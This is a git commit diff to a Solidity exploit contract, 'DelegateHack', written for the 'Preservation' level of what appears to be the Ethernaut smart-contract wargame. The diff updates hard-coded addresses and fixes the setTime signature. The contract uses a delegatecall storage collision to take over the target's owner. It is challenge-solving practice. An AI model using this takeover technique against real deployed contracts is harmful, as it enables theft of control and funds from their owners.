06821f4bb6146252242412a4cc2cfb8834cd13d7
xiaolou86 <lzhengwei@aliyun.com>
2023-01-19 14:11:00 +0800

    fix level16

--- src/level16.sol
+++ src/level16.sol
@@ -8,15 +8,15 @@ contract DelegateHack {
     address public t1;
     address public t2;
     address public owner;
-    Preservation level16 = Preservation(0x1E422B805DC5541a09fBbf239D734313B9F42Eca);      
+    Preservation level16 = Preservation(0x7709b4AA6aC44EEC15201a90d3C8E484618F2cD3);      
 
     function exploit() external {
         level16.setFirstTime(uint256(address(this)));
-        level16.setFirstTime(uint256(0xEAce4b71CA1A128e8B562561f46896D55B9B0246));
+        level16.setFirstTime(uint256(0xE94eE0D98415D86ddbA0df1e8b733B4A332D3fbD));
     }
 
-    function setTime(address _owner) public {
-        owner = _owner;
+    function setTime(uint256 _owner) public {
+        owner = address(_owner);
     }
 
 }
